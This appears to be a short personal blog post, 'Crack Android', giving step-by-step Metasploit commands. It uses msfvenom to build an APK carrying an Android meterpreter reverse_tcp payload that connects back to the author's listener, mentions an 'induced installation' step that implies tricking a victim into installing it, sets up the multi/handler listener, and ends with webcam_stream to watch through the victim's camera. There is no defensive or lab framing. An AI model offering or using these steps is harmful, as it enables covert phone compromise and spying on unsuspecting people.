---
title: Crack Android
date: 2023/01/19 18:42
location: Dongguan
tags: Original Linux Metasploit
---

## Generate apk file
```sh
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.106 lport=8848 > test.apk
```
* lhost Listening hostname
* lport Listening port

## Induced installation

## Listening
Enter msf
```sh
msfconsole
```
Open Listening
```sh
use exploit/multi/handler
```
```sh
set payload android/meterpreter/reverse_tcp
```
```sh
set lhost 192.168.0.106
```
```sh
run
```
Get webcamera
```sh
webcam_stream
```

